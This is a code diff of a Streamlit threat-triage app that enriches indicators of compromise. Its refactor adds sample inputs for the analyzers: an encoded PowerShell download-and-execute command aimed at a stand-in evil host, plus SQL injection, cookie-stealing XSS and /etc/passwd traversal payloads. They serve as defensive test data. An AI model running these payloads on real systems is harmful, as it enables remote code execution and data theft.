@@ -1,32 +1,15 @@
 """IOC Router - Streamlit app entrypoint (3-tab layout)."""
 from __future__ import annotations
 
-import dataclasses
-
 import streamlit as st
 import streamlit.components.v1 as components
 
 from config import Settings
 from ioc.parser import IOC, parse_iocs
-from ioc.verdict import summarize_results
-from core.process_analyzer import (
-    ProcessFilepathInput,
-    aggregate_verdict as aggregate_process_verdict,
-    analyze_process_event,
-    to_rows as process_analysis_rows,
-)
-from core.cmdline_analyzer import (
-    CommandLineInput,
-    analyze_command_line,
-    to_rows as cmdline_analysis_rows,
-)
-from core.waf_payload_analyzer import (
-    analyze_waf_payload,
-    to_rows as waf_analysis_rows,
-)
 from core.waf_payload_parser import parse_waf_field
 from core.cache import CACHE_REV, cve_by_id_cached
-from core.orchestrator import PROVIDER_KEYS, run_provider_lookups
+from core.orchestrator import PROVIDER_KEYS
+from core.pipeline import EnrichmentInput, run_enrichment
 from ui.styles import build_global_css_and_header, LANDING_CSS
 from ui.components.drawer import render_api_drawer
 from ui.components.output_renderer import (
@@ -390,6 +373,18 @@ if st.session_state.get("reset_input"):
 
 if st.session_state.get("load_sample"):
     st.session_state["ioc_input"] = "8.8.8.8\nexample.com\nhttps://example.com/login\n44d88612fea8a8f36de82e1278abb02f"
+    st.session_state["command_line"] = (
+        "powershell.exe -nop -w hidden -enc "
+        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
+    )
+    st.session_state["waf_payload_field"] = (
+        "/login | ' OR '1'='1\n"
+        "/search | <script>alert(document.cookie)</script>\n"
+        "/download | ../../../../etc/passwd"
+    )
+    st.session_state["file_path"] = "C:\\Windows\\Temp\\scvhost.exe"
+    st.session_state["parent_process"] = "winword.exe"
+    st.session_state["child_process"] = "cmd.exe"
     st.session_state["load_sample"] = False
     raw = st.session_state["ioc_input"]
 
@@ -1154,182 +1149,45 @@ def _has_process_input() -> bool:
 
 # ── Enrichment execution (triggered from Input tab Run button) ───────────────
 if run_requested and (raw.strip() or _has_process_input()):
-    # ── WAF payload analysis (docs/waf_payload_analyzer.md D6) ─────────
-    # WAF payloads now arrive through their own Context field rather than the
-    # main IOC textarea, so ``items`` never contains one and needs no
-    # partitioning — summarize_results() only ever sees actual IOCs.
-    # Provider dispatch has nothing to special-case either: this list is never
-    # passed to ``_payload()``, so a payload cannot be handed to a provider
-    # even by accident.
-    items = list(parsed_input_items)
-    _waf_items = parse_waf_field(waf_payload_field)
-    _waf_results = [analyze_waf_payload(w) for w in _waf_items]
-    # NVD/KEV enrichment for a matched CVE fingerprint happens here, not in the
-    # analyzer: that module performs no network I/O, and its verdict must never
-    # depend on a lookup succeeding (docs/waf_payload_analyzer.md D4). A failed
-    # call leaves ``nvd``/``kev`` as None, which the UI renders as "not
-    # retrieved" — never as "not known-exploited".
-    _waf_cve_cache: dict[str, dict | None] = {}
-    for _wr in _waf_results:
-        _fp = _wr.cve_fingerprint_match
-        if not _fp:
-            continue
-        _cve_id = _fp["cve"]
-        if _cve_id not in _waf_cve_cache:
-            _waf_cve_cache[_cve_id] = cve_by_id_cached(_cve_id, CACHE_REV)
-        _record = _waf_cve_cache[_cve_id]
-        _fp["nvd"] = _record
-        _fp["kev"] = bool(_record.get("isKev")) if _record else None
-    if not items and not _waf_items and not _has_process_input():
+    _enrichment_input = EnrichmentInput(
+        items=list(parsed_input_items),
+        waf_payloads=parse_waf_field(waf_payload_field),
+        file_path=file_path,
+        parent_process=parent_process,
+        child_process=child_process,
+        command_line=command_line,
+        context=raw_log,
+        allow_urlscan_submit=allow_urlscan_submit,
+    )
+
+    def _allowed_for(items_for_lookup: list[IOC]) -> dict[str, set[str]]:
+        """Resolve which providers may run, from the current widget state.
+
+        Passed into the pipeline as a callback because it reads session state,
+        and because the list it applies to only exists once the local analyzers
+        have contributed the IOCs they recovered.
+        """
+        if not auto_choose_provider:
+            return _manual_allowed_by_type(items_for_lookup)
+        _mode = st.session_state.get("analysis_mode", "Triage")
+        _fast = (
+            _mode == "Triage"
+            and st.session_state.get("triage_speed", "Detailed") == "Fast"
+        )
+        return _auto_allowed_by_type(items_for_lookup, settings, mode=_mode, fast=_fast)
+
+    if _enrichment_input.is_empty:
         st.info("Tidak ada IOC valid setelah parsing.")
     else:
-        # ── Process / filepath analysis (local, no network) ───────────────────
-        # Runs before provider selection so any hash found in Context joins the
-        # normal IOC list and gets enriched by the existing pipeline, rather
-        # than needing a second lookup path.
-        _proc_result = analyze_process_event(ProcessFilepathInput(
-            file_path=file_path or None,
-            parent_process=parent_process or None,
-            child_process=child_process or None,
-            context=raw_log or None,
-        ))
-        _known_values = {i.value for i in items}
-        _context_hashes = [h for h in _proc_result.hash_candidates if h not in _known_values]
-        items = items + [IOC(value=h, type="hash") for h in _context_hashes]
-
-        # ── Command line analysis (local, no network) ─────────────────────────
-        # Runs after the process analysis so it can cross-reference that
-        # module's findings, and before provider selection so indicators
-        # recovered from a decoded payload join the normal enrichment path.
-        _cmd_result = analyze_command_line(CommandLineInput(
-            command_line=command_line or None,
-            context=raw_log or None,
-            linked_process=_proc_result,
-        ))
-        _known_values = {i.value for i in items}
-        _derived_iocs = [
-            i for i in parse_iocs("\n".join(_cmd_result.ioc_candidates))
-            if i.value not in _known_values
-        ]
-        # URLs recovered from a decoded payload are looked up, never submitted.
-        # Submitting an attacker's URL to URLScan's public queue is an outbound
-        # disclosure the analyst did not ask for and cannot take back.
-        _derived_submit_blocked = {i.value for i in _derived_iocs if i.type == "url"}
-        items = items + _derived_iocs
-
-        if auto_choose_provider:
-            _current_mode = st.session_state.get("analysis_mode", "Triage")
-            _is_triage_fast = (
-                _current_mode == "Triage"
-                and st.session_state.get("triage_speed", "Detailed") == "Fast"
-            )
-            allowed_by_type = _auto_allowed_by_type(
-                items, settings, mode=_current_mode, fast=_is_triage_fast,
-            )
-        else:
-            allowed_by_type = _manual_allowed_by_type(items)
-
-        def _payload(p: str) -> list[tuple[str, str, bool]]:
-            return [
-                (ioc.value, ioc.type, ioc.scheme_inferred)
-                for ioc in items
-                if p in allowed_by_type.get(ioc.type, set())
-                # URLScan takes one submit/lookup-only flag for the whole call,
-                # so a URL recovered from a decoded payload is held back from
-                # that provider entirely rather than risking a public
-                # submission. Every other provider still enriches it.
-                and not (p == "urlscan" and ioc.value in _derived_submit_blocked)
-            ]
-
-        provider_flags = {p: bool(_payload(p)) for p in _PROVIDER_KEYS}
-
         # Every enabled provider runs on its own worker thread, so the wait is
         # the slowest provider rather than the sum of all of them.
         with st.spinner("Menjalankan provider lookup…"):
-            _provider_results, _timings = run_provider_lookups(
+            st.session_state["run_results"] = run_enrichment(
+                _enrichment_input,
                 settings=settings,
-                provider_flags=provider_flags,
-                payload_for=_payload,
-                allow_urlscan_submit=allow_urlscan_submit,
+                allowed_for=_allowed_for,
+                cve_lookup=lambda cve_id: cve_by_id_cached(cve_id, CACHE_REV),
             )
-
-        vt_results              = _provider_results["vt"]
-        urlscan_results         = _provider_results["urlscan"]
-        abuse_results           = _provider_results["abuse"]
-        tf_results              = _provider_results["tf"]
-        mb_results              = _provider_results["mb"]
-        shodan_results          = _provider_results["shodan"]
-        dnsd_results            = _provider_results["dnsd"]
-        ha_results              = _provider_results["ha"]
-        mxtoolbox_results       = _provider_results["mxtoolbox"]
-        whoxy_results           = _provider_results["whoxy"]
-        ransomware_live_results = _provider_results["ransomware_live"]
-
-        summary, rows = summarize_results(
-            items,
-            vt_results,
-            urlscan_results,
-            abuse_results,
-            tf_results,
-            mb_results,
-            shodan_results=shodan_results,
-            hybrid_results=ha_results,
-        )
-
-        # Layer 3 close-out: a hash lifted from Context has now been through the
-        # normal providers, so feed its verdict back. It is the strongest signal
-        # available and overrides the name-based layers in aggregation.
-        if _context_hashes:
-            _hash_rows = [r for r in rows if r.get("Artifact") in set(_context_hashes)]
-            _decisive = next(
-                (r for r in _hash_rows if r.get("Verdict") in ("Malicious", "Suspicious")),
-                None,
-            )
-            if _decisive is not None:
-                _proc_result.hash_verdict = {
-                    "verdict": _decisive.get("Verdict"),
-                    "artifact": _decisive.get("Artifact"),
-                    "evidence": _decisive.get("Primary Evidence"),
-                    "sources": _decisive.get("Sources"),
-                }
-                _proc_result.aggregated_verdict = aggregate_process_verdict(_proc_result)
-
-        st.session_state["run_results"] = {
-            "items": items,
-            "summary": summary,
-            "rows": rows,
-            "vt": vt_results,
-            "urlscan": urlscan_results,
-            "abuse": abuse_results,
-            "tf": tf_results,
-            "mb": mb_results,
-            "shodan": shodan_results,
-            "dnsd": dnsd_results,
-            "ha": ha_results,
-            "mxtoolbox": mxtoolbox_results,
-            "whoxy": whoxy_results,
-            "ransomware_live": ransomware_live_results,
-            "provider_flags": provider_flags,
-            # Kept out of "rows": that list is indexed per-artifact by the IOC
-            # cards and counted by the session summary, both of which assume one
-            # entry per atomic IOC.
-            # Partitioned out of ``items`` above (D6). Rows are kept separate
-            # from ``rows`` for the same reason the process module keeps its
-            # own: three consumers of that list assume one entry per atomic IOC.
-            "waf_analysis": [dataclasses.asdict(r) for r in _waf_results],
-            "waf_flags": [f for r in _waf_results for f in r.flags],
-            "waf_rows": [row for r in _waf_results for row in waf_analysis_rows(r)],
-            "process_analysis": dataclasses.asdict(_proc_result),
-            "process_flags": _proc_result.flags,
-            # Command-line rows share the process rows' column schema exactly
-            # (asserted by a test), so the renderer concatenates the two
-            # without caring which module produced a row.
-            "process_rows": process_analysis_rows(_proc_result) + cmdline_analysis_rows(_cmd_result),
-            "cmdline_analysis": dataclasses.asdict(_cmd_result),
-            "cmdline_flags": _cmd_result.flags,
-            "allowed_by_type": {t: sorted(ps) for t, ps in allowed_by_type.items()},
-            "timings": _timings,
-        }
         # New enrichment run invalidates any prior AI timing — it belongs to
         # the previous result set. Auto-AI (if enabled) will repopulate it.
         st.session_state.pop("ai_timing", None)
@@ -1343,6 +1201,7 @@ if run_requested and (raw.strip() or _has_process_input()):
         # next script run, before the widget renders.
         st.session_state["_pending_tab_switch"] = "Result"
         st.rerun()
+
 
 # ── Tab 2 (Result) rendering — runs after enrichment block above ─────────────
 if active_tab == "Result":
